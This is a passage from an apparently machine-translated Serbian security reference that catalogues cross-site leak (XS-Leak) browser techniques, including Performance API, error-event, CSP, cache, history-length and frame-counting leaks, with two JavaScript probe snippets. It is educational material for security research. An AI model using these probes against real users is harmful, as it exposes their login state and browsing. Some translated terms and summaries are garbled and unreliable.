- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** Resurs sa X-Frame-Options zaglavljem ne kreira ulaz u vremenu resursa.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako stranica **nije dozvoljena** da bude **renderovana** u **iframe-u**, ona ne **kreira ulaz u performansama**. Kao rezultat, napadač može detektovati zaglavlje odgovora **`X-Frame-Options`**.\
Isto se dešava ako koristite **embed** **tag.**

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Zaglavlje
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Preuzimanja ne kreiraju ulaze u vremenu resursa u Performance API.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Slično, kao što je opisano u XS-Leak-u, **resurs koji se preuzima** zbog zaglavlja ContentDisposition, takođe ne **kreira ulaz u performansama**. Ova tehnika funkcioniše u svim glavnim pregledačima.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Preusmeravanje
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Ulaz u vremenu resursa curi vreme početka preusmeravanja.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Pronašli smo jedan primer XS-Leak-a koji zloupotrebljava ponašanje nekih pregledača koji beleže previše informacija za zahteve sa drugog domena. Standard definiše podskup atributa koji bi trebali biti postavljeni na nulu za resurse sa drugog domena. Međutim, u **SA** je moguće detektovati da li je korisnik **preusmeren** od strane ciljne stranice, upitom u **Performance API** i proverom za **redirectStart vremenske podatke**.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Preusmeravanje
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Trajanje vremenskih unosa je negativno kada dođe do preusmeravanja.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC, **trajanje** za zahteve koji rezultiraju **preusmeravanjem** je **negativno** i tako se može **razlikovati** od zahteva koji ne rezultiraju preusmeravanjem.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Zaglavlje
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Resurs zaštićen CORP-om ne kreira ulaze u vremenu resursa.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim slučajevima, **nextHopProtocol unos** može se koristiti kao tehnika curenja. U GC, kada je **CORP zaglavlje** postavljeno, nextHopProtocol će biti **prazan**. Imajte na umu da SA uopšte neće kreirati ulaz u performansama za resurse omogućene CORP-om.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Usage
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Detektovati da li je servisni radnik registrovan za određeni domen.
- **Code Example**:

Servisni radnici su skriptni konteksti vođeni događajima koji se izvršavaju na domenu. Oni rade u pozadini web stranice i mogu presresti, modifikovati i **keširati resurse** kako bi stvorili offline web aplikaciju.\
Ako je **resurs keširan** od strane **servisnog radnika** pristupljen putem **iframe-a**, resurs će biti **učitan iz keša servisnog radnika**.\
Da bi se detektovalo da li je resurs **učitan iz keša servisnog radnika**, može se koristiti **Performance API**.\
To se takođe može uraditi sa napadom na vreme (proverite rad za više informacija).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Vreme
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Moguće je proveriti da li je resurs sačuvan u kešu.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Korišćenjem [Performance API](xs-search.md#performance-api) moguće je proveriti da li je resurs keširan.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Sadržaj stranice
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** Moguće je dobiti mrežno trajanje zahteva iz `performance` API.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Status kod
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** U Firefox-u je moguće precizno curiti status kod zahteva sa drugog domena.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError` интерфейс ima svojstvo poruke koje jedinstveno identifikuje resurse koji se uspešno učitavaju sa različitim stringom. Napadač može iskoristiti ovu funkciju posmatrajući sadržaj poruke, čime može da zaključi status odgovora resursa sa različitih izvora.

### CORS Greška

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Sažetak:** U Bezbednosnim Asertivima (SA), CORS poruke greške nenamerno otkrivaju pun URL preusmerenih zahteva.
- **Primer koda**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ova tehnika omogućava napadaču da **izvuče odredište preusmerenja sa sajta različitog porekla** iskorišćavajući način na koji Webkit-bazirani pregledači obrađuju CORS zahteve. Konkretno, kada se **CORS-om omogućeni zahtev** šalje na ciljni sajt koji izdaje preusmerenje na osnovu stanja korisnika, a pregledač kasnije odbije zahtev, **pun URL odredišta preusmerenja** se otkriva unutar poruke greške. Ova ranjivost ne samo da otkriva činjenicu preusmerenja, već takođe izlaže odredište preusmerenja i sve **osetljive parametre upita** koje može sadržati.

### SRI Greška

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Sažetak:** U Bezbednosnim Asertivima (SA), CORS poruke greške nenamerno otkrivaju pun URL preusmerenih zahteva.
- **Primer koda**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Napadač može iskoristiti **detaljne poruke greške** da zaključi veličinu odgovora sa različitih izvora. To je moguće zbog mehanizma Integriteta Podresursa (SRI), koji koristi atribut integriteta da verifikuje da resursi preuzeti, često sa CDN-ova, nisu bili izmenjeni. Da bi SRI radio na resursima sa različitih izvora, oni moraju biti **CORS-om omogućeni**; inače, nisu podložni proverama integriteta. U Bezbednosnim Asertivima (SA), slično CORS grešci XS-Leak, poruka greške može biti zabeležena nakon što zahtev za preuzimanje sa atributom integriteta ne uspe. Napadači mogu namerno **pokrenuti ovu grešku** dodeljujući **lažnu hash vrednost** atributu integriteta bilo kog zahteva. U SA, rezultantna poruka greške nenamerno otkriva dužinu sadržaja traženog resursa. Ova informacija omogućava napadaču da uoči varijacije u veličini odgovora, otvarajući put za sofisticirane XS-Leak napade.

### CSP Kršenje/Detekcija

- **Metode uključivanja**: Iskočne prozore
- **Uočljiva razlika**: Status kod
- **Više informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Sažetak:** Dozvoljavajući samo vebsajt žrtve u CSP-u, ako pokušava da preusmeri na drugu domenu, CSP će izazvati uočljivu grešku.
- **Primer koda**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak može koristiti CSP za detekciju da li je sajt sa različitog porekla preusmeren na drugu domenu. Ova greška može detektovati preusmerenje, ali dodatno, domen odredišta preusmerenja se otkriva. Osnovna ideja ovog napada je da **dozvoli ciljni domen na sajtu napadača**. Kada se pošalje zahtev ka ciljnog domenu, on **preusmerava** na domenu sa različitog porekla. **CSP blokira** pristup i kreira **izveštaj o kršenju koji se koristi kao tehnika curenja**. U zavisnosti od pregledača, **ovaj izveštaj može otkriti odredišnu lokaciju preusmerenja**.\
Moderni pregledači neće ukazati na URL na koji je preusmereno, ali i dalje možete detektovati da je preusmerenje sa različitog porekla pokrenuto.

### Keš

- **Metode uključivanja**: Okviri, Iskočne prozore
- **Uočljiva razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Sažetak:** Očistite datoteku iz keša. Otvara ciljanju stranicu proverava da li je datoteka prisutna u kešu.
- **Primer koda:**

Pregledači mogu koristiti jedan zajednički keš za sve vebsajtove. Bez obzira na njihov izvor, moguće je zaključiti da li je ciljana stranica **zahtevala određenu datoteku**.

Ako stranica učitava sliku samo ako je korisnik prijavljen, možete **poništiti** **resurs** (tako da više nije keširan ako je bio, više informacija u linkovima), **izvršiti zahtev** koji bi mogao učitati taj resurs i pokušati učitati resurs **sa lošim zahtevom** (npr. koristeći predugačak referer header). Ako učitavanje resursa **nije izazvalo grešku**, to je zato što je **keširan**.

### CSP Direktiva

- **Metode uključivanja**: Okviri
- **Uočljiva razlika**: Header
- **Više informacija**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Sažetak:** CSP header direktive mogu se ispitivati koristeći CSP iframe atribut, otkrivajući detalje politike.
- **Primer koda**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Nova funkcija u Google Chrome-u (GC) omogućava veb stranicama da **predlože Politiku Bezbednosti Sadržaja (CSP)** postavljanjem atributa na iframe element, pri čemu se direktive politike prenose zajedno sa HTTP zahtevom. Obično, ugrađeni sadržaj mora **odobriti ovo putem HTTP header-a**, ili se **prikazuje stranica greške**. Međutim, ako je iframe već pod upravom CSP-a i nova predložena politika nije restriktivnija, stranica će se učitati normalno. Ovaj mehanizam otvara put napadaču da **detektuje specifične CSP direktive** stranice sa različitog porekla identifikovanjem stranice greške. Iako je ova ranjivost označena kao ispravljena, naši nalazi otkrivaju **novu tehniku curenja** sposobnu da detektuje stranicu greške, sugerišući da problem nikada nije u potpunosti rešen.

### **CORP**

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Header
- **Više informacija**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Sažetak:** Resursi zaštićeni Politikom Resursa sa Različitih Izvora (CORP) će izazvati grešku kada se preuzmu sa zabranjenog porekla.
- **Primer koda**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP header je relativno nova funkcija bezbednosti veb platforme koja kada je postavljena **blokira no-cors zahteve sa različitih izvora za dati resurs**. Prisutnost header-a može se detektovati, jer resurs zaštićen CORP-om će **izazvati grešku kada se preuzme**.

### CORB

- **Metode uključivanja**: HTML elementi
- **Uočljiva razlika**: Headers
- **Više informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Sažetak**: CORB može omogućiti napadačima da detektuju kada je **`nosniff` header prisutan** u zahtevu.
- **Primer koda**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Proverite link za više informacija o napadu.

### CORS greška na pogrešnoj konfiguraciji refleksije porekla <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Headers
- **Više informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Sažetak**: Ako se header Origin reflektuje u header-u `Access-Control-Allow-Origin`, moguće je proveriti da li je resurs već u kešu.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U slučaju da se **Origin header** **reflektuje** u header-u `Access-Control-Allow-Origin`, napadač može iskoristiti ovo ponašanje da pokuša da **preuzme** **resurs** u **CORS** režimu. Ako **greška** **nije** izazvana, to znači da je **ispravno preuzet sa veba**, ako je greška **izazvana**, to je zato što je **pristupano iz keša** (greška se pojavljuje jer keš čuva odgovor sa CORS header-om koji dozvoljava originalnu domenu, a ne domenu napadača)**.**\
Napomena: ako se poreklo ne reflektuje, ali se koristi wildcard (`Access-Control-Allow-Origin: *`), ovo neće raditi.

## Tehnika čitljivih atributa

### Fetch Preusmerenje

- **Metode uključivanja**: Fetch API
- **Uočljiva razlika**: Status kod
- **Više informacija**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Sažetak:** GC i SA omogućavaju proveru tipa odgovora (opaque-redirect) nakon što je preusmerenje završeno.
- **Primer koda**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Podnošenje zahteva koristeći Fetch API sa `redirect: "manual"` i drugim parametrima, moguće je pročitati atribut `response.type` i ako je jednak `opaqueredirect`, tada je odgovor bio preusmerenje.

### COOP

- **Metode uključivanja**: Iskočne prozore
- **Uočljiva razlika**: Header
- **Više informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Sažetak:** Stranice zaštićene Politikom Otvorene Provere sa Različitih Izvora (COOP) sprečavaju pristup iz interakcija sa različitih izvora.
- **Primer koda**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Napadač može zaključiti prisustvo header-a Politike Otvorene Provere sa Različitih Izvora (COOP) u HTTP odgovoru sa različitog porekla. COOP se koristi od strane veb aplikacija da spreči spoljne sajtove da dobiju proizvoljne reference prozora. Vidljivost ovog header-a može se uočiti pokušajem pristupa **`contentWindow` referenci**. U scenarijima gde se COOP primenjuje uslovno, **`opener` svojstvo** postaje indikator: **nije definisano** kada je COOP aktivan, i **definisano** u njegovom odsustvu.

### Maksimalna dužina URL-a - Server strana

- **Metode uključivanja**: Fetch API, HTML elementi
- **Uočljiva razlika**: Status kod / Sadržaj
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Sažetak:** Detektujte razlike u odgovorima jer dužina odgovora preusmerenja može biti prevelika da bi server odgovorio greškom i generisao upozorenje.
- **Primer koda**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako server-side preusmerenje koristi **korisnički unos unutar preusmeravanja** i **dodatne podatke**. Moguće je detektovati ovo ponašanje jer obično **serveri** imaju **ograničenje dužine zahteva**. Ako su **korisnički podaci** te **dužine - 1**, jer **preusmerenje** koristi **te podatke** i **dodaje** nešto **dodatno**, izazvaće **grešku koja se može detektovati putem događaja greške**.

Ako možete nekako postaviti kolačiće korisniku, takođe možete izvršiti ovaj napad postavljanjem dovoljno kolačića ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) tako da sa **povećanom veličinom odgovora** **ispravnog odgovora** dođe do **greške**. U ovom slučaju, zapamtite da ako pokrenete ovaj zahtev sa istog sajta, `<script>` će automatski poslati kolačiće (tako da možete proveriti greške).\
Primer **cookie bomb + XS-Search** može se naći u predloženom rešenju ovog izveštaja: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ili da bude u istom kontekstu obično je potrebno za ovu vrstu napada.

### Maksimalna dužina URL-a - Klijent strana

- **Metode uključivanja**: Iskočne prozore
- **Uočljiva razlika**: Status kod / Sadržaj
- **Više informacija**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Sažetak:** Detektujte razlike u odgovorima jer dužina odgovora preusmerenja može biti prevelika za zahtev da bi se primetila razlika.
- **Primer koda**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Prema [Chromium dokumentaciji](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), maksimalna dužina URL-a u Chrome-u je 2MB.

> Uopšteno, _veb platforma_ nema ograničenja na dužinu URL-ova (iako je 2^31 uobičajeno ograničenje). _Chrome_ ograničava URL-ove na maksimalnu dužinu od **2MB** iz praktičnih razloga i da bi se izbegli problemi sa uskraćivanjem usluge u međuprocesnoj komunikaciji.

Dakle, ako je **preusmereni URL veći u jednom od slučajeva**, moguće je učiniti da se preusmeri sa **URL-om većim od 2MB** kako bi se dostiglo **ograničenje dužine**. Kada se to dogodi, Chrome prikazuje stranicu **`about:blank#blocked`**.

**Uočljiva razlika** je da ako je **preusmerenje** bilo **završeno**, `window.origin` izaziva **grešku** jer sa različitog porekla ne može pristupiti tim informacijama. Međutim, ako je **ograničenje** \*\*\*\* dostignuto i učitana stranica je **`about:blank#blocked`**, **`origin`** prozora ostaje onaj od **roditelja**, što je **pristupačna informacija.**

Sve dodatne informacije potrebne za dostizanje **2MB** mogu se dodati putem **hash-a** u inicijalnom URL-u tako da će biti **iskorišćene u preusmerenju**.

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### Maksimalni Preusmeraji

- **Metode uključivanja**: Fetch API, Okviri
- **Uočljiva razlika**: Status kod
- **Više informacija**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Sažetak:** Iskoristite ograničenje preusmeravanja pregledača da utvrdite da li je došlo do URL preusmeravanja.
- **Primer koda**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je **maksimalan** broj **preusmeranja** koji pregledač može pratiti **20**, napadač može pokušati da učita svoju stranicu sa **19 preusmeranja** i konačno **pošalje žrtvu** na testiranu stranicu. Ako se **greška** izazove, tada je stranica pokušavala da **preusmeri žrtvu**.

### Dužina Istorije

- **Metode uključivanja**: Okviri, Iskočne prozore
- **Uočljiva razlika**: Preusmeranja
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Sažetak:** JavaScript kod manipuliše istorijom pregledača i može se pristupiti putem svojstva dužine.
- **Primer koda**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**History API** omogućava JavaScript kodu da manipuliše istorijom pregledača, koja **čuva stranice koje je korisnik posetio**. Napadač može koristiti svojstvo dužine kao metodu uključivanja: da detektuje JavaScript i HTML navigaciju.\
**Proveravajući `history.length`**, navodeći korisnika da **navigira** na stranicu, **menjajući** je **nazad** na istog porekla i **proveravajući** novu vrednost **`history.length`**.

### Dužina Istorije sa istim URL-om

- **Metode uključivanja**: Okviri, Iskočne prozore
- **Uočljiva razlika**: Ako je URL isti kao onaj koji se pogađa
- **Sažetak:** Moguće je pogoditi da li se lokacija okvira/iskočnog prozora nalazi na određenom URL-u zloupotrebljavajući dužinu istorije.
- **Primer koda**: Ispod

Napadač može koristiti JavaScript kod da **manipuliše lokacijom okvira/iskočnog prozora na pogodnu** i **odmah** **je promeni na `about:blank`**. Ako se dužina istorije povećala, to znači da je URL bio tačan i imao je vremena da se **poveća jer se URL ne ponovo učitava ako je isti**. Ako se nije povećala, to znači da je **pokušao da učita pogodjeni URL**, ali zato što smo **odmah nakon** učitali **`about:blank`**, **dužina istorije nikada nije povećana** prilikom učitavanja pogodjenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Brojanje Okvira

- **Metode Uključivanja**: Okviri, Pop-up prozori
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Sažetak:** Procena količine iframe elemenata inspekcijom `window.length` svojstva.
- **Primer Koda**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja okvira na web** stranici otvorenoj putem `iframe` ili `window.open` može pomoći u identifikaciji **statusa korisnika na toj stranici**.\
Pored toga, ako stranica uvek ima isti broj okvira, kontinuirano proveravanje broja okvira može pomoći u identifikaciji **obraza** koji može otkriti informacije.

Primer ove tehnike je da se u Chrome-u **PDF** može **otkriti** pomoću **brojanja okvira** jer se `embed` koristi interno. Postoje [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omogućavaju određenu kontrolu nad sadržajem kao što su `zoom`, `view`, `page`, `toolbar` gde bi ova tehnika mogla biti zanimljiva.

### HTMLElements

- **Metode Uključivanja**: HTML elementi
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Sažetak:** Pročitajte otkrivenu vrednost da biste razlikovali između 2 moguća stanja
- **Primer Koda**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Curjenje informacija kroz HTML elemente je zabrinjavajuće u web bezbednosti, posebno kada se dinamički medijski fajlovi generišu na osnovu korisničkih informacija, ili kada se dodaju vodeni žigovi, menjajući veličinu medija. Ovo mogu iskoristiti napadači da razlikuju između mogućih stanja analizirajući informacije koje izlažu određeni HTML elementi.

### Informacije Otkrite HTML Elementima

- **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, koji se mogu pristupiti putem njegovog API-ja. [Pročitajte više o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Otkazuje `videoHeight` i `videoWidth`. U nekim pregledačima, dodatna svojstva kao što su `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, i `webkitDecodedFrameCount` su dostupna, nudeći dublje informacije o sadržaju medija. [Pročitajte više o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Ova funkcija pruža detalje o kvalitetu reprodukcije videa, uključujući `totalVideoFrames`, što može ukazivati na količinu obrađenih video podataka. [Pročitajte više o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. Međutim, ako je slika nevažeća, ova svojstva će vratiti 0, a funkcija `image.decode()` će biti odbijena, što ukazuje na neuspeh učitavanja slike ispravno. [Pročitajte više o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Svojstvo

- **Metode Uključivanja**: HTML elementi
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Sažetak:** Identifikujte varijacije u stilizovanju web stranice koje se koreliraju sa stanjem ili statusom korisnika.
- **Primer Koda**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web aplikacije mogu menjati **stilizovanje web stranice u zavisnosti od statusa korisnika**. CSS datoteke iz drugih domena mogu biti uključene na stranici napadača pomoću **HTML link elementa**, a **pravila** će biti **primenjena** na stranicu napadača. Ako stranica dinamički menja ova pravila, napadač može **otkriti** ove **razlike** u zavisnosti od stanja korisnika.\
Kao tehnika curenja, napadač može koristiti `window.getComputedStyle` metodu da **pročita CSS** svojstva određenog HTML elementa. Kao rezultat, napadač može čitati proizvoljna CSS svojstva ako su poznati pogođeni element i naziv svojstva.

### CSS Istorija

- **Metode Uključivanja**: HTML elementi
- **Uočljiva Razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Sažetak:** Otkrivanje da li je stil `:visited` primenjen na URL koji ukazuje da je već posetjen
- **Primer Koda**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioniše u headless Chrome-u.

CSS `:visited` selektor se koristi za stilizovanje URL-ova drugačije ako su prethodno posetili korisnik. U prošlosti, `getComputedStyle()` metoda se mogla koristiti za identifikaciju ovih razlika u stilu. Međutim, moderni pregledači su implementirali bezbednosne mere kako bi sprečili ovu metodu da otkrije stanje linka. Ove mere uključuju uvek vraćanje izračunatog stila kao da je link posetjen i ograničavanje stilova koji se mogu primeniti sa `:visited` selektorom.

